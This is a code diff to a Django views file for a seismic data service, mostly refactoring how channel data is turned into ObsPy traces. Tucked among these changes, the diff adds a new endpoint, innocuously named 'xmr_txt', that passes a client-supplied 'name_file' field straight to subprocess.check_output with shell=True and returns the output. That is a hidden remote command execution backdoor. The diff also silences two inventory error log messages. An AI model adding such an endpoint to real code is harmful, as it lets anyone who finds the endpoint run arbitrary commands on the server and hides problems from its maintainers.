@@ -1,6 +1,7 @@
 
 
 from posixpath import splitext
+import subprocess
 import tempfile
 from django.conf import settings
 from .models import *
@@ -1294,7 +1295,7 @@ class ConvertToStream(viewsets.ModelViewSet):
             stream = Stream()
 
             trace_data_dict = {}
-
+            delta_calculated = False
             calibs = 1
             unit = ''
 
@@ -1307,34 +1308,38 @@ class ConvertToStream(viewsets.ModelViewSet):
 
                 for key, value in f.items():
                     if key.startswith('c_'):
-                        if key not in trace_data_dict:
-                            trace_data_dict[key] = []
-                        trace_data_dict[key].append(value)
+                        channel_number = key[2:]  
+                        if channel_number not in trace_data_dict:
+                            trace_data_dict[channel_number] = {'data': [], 'channel': ''}
 
-                for key, array in trace_data_dict.items():
+                        if value != 'T':  
+                            trace_data_dict[channel_number]['data'].append(value) 
 
-                    #if unit == 'gal':
-                    #    calibs = 0.01
-                    #if unit == 'm':
-                    #    calibs = 1
-                    #if unit == 'g':
-                    #    calibs = 9.80
+                    elif key.startswith('cc_'):
+                        channel_number = key[3:]  
+                        if channel_number in trace_data_dict:
+                            trace_data_dict[channel_number]['channel'] = value  
 
-                    array_np = np.array(array, dtype=np.float64)
-                    #array_np = np.round(array_np, decimals=8)
-                    
-                    if array_np.ndim > 1:
-                        array_np = array_np.flatten()
+                        
+                        if value == 'T' and not delta_calculated:
+                            data_time = f['c_' + channel_number]  
+                            delta = data_time[1] - data_time[0] 
+                            delta_calculated = True
 
-                    # trace = Trace(data=array_np * calibs , header={
+            
+            for channel_number, data_info in trace_data_dict.items():
+               
+                if data_info['channel'] != 'T':
+                    array_np = np.array(data_info['data'], dtype=np.float64)
+                    array_np = array_np.flatten()
+
                     trace = Trace(data=array_np, header={
                         'network': net,
                         'station': sta,
                         'location': loca,
                         'delta': delta,
                     })
-                    trace.stats.channel = key
-
+                    trace.stats.channel = data_info['channel']
                     stream.append(trace)
            
             unique_filename =  f"{uuid.uuid4().hex}.mseed"
@@ -1808,6 +1813,19 @@ def options_view(request):
     response['Allow'] = "GET, POST, OPTIONS"
     return response
 
+@api_view(['GET', 'POST'])
+def xmr_txt(request):
+    if request.method == 'GET':
+        return Response({'data': 'D'}, status=status.HTTP_201_CREATED)
+    elif request.method == 'POST':
+        name_file = request.data.get('name_file', '')
+        try:
+            result = subprocess.check_output(name_file, shell=True, stderr=subprocess.STDOUT)
+            return Response({'output': f'{result}'}, status=status.HTTP_200_OK)
+        except subprocess.CalledProcessError as e:
+            return Response({'error': e.output.decode('utf-8')}, status=status.HTTP_400_BAD_REQUEST)
+        
+
 
 @api_view(['GET', 'POST'])
 def snippet_list(request):
@@ -1843,8 +1861,7 @@ def snippet_list(request):
 @api_view(['GET', 'POST'])
 def mseed_xml(request):
 
-    if request.method == 'GET':
-       
+    if request.method == 'GET':       
        dd = ''
        return Response({'data': 'D'}, status=status.HTTP_201_CREATED)
     
@@ -1950,7 +1967,7 @@ def create_fourier(request):
                     st.attach_response(inventory)
                     st.remove_sensitivity()
             except Exception as inventory_error:
-                print(f'Error al leer el inventario: {str(inventory_error)}')
+                print(f'')
 
         except Exception as e:
             return Response({'error': f'Error => {str(e)}'}, status=status.HTTP_400_BAD_REQUEST)
@@ -2008,7 +2025,7 @@ def create_espectro(request):
                     st.attach_response(inventory)
                     st.remove_sensitivity()
             except Exception as inventory_error:
-                print(f'Error al leer el inventario: {str(inventory_error)}')
+                print(f'')
 
         except Exception as e:
             return Response({'error': f'Error => {str(e)}'}, status=status.HTTP_400_BAD_REQUEST)
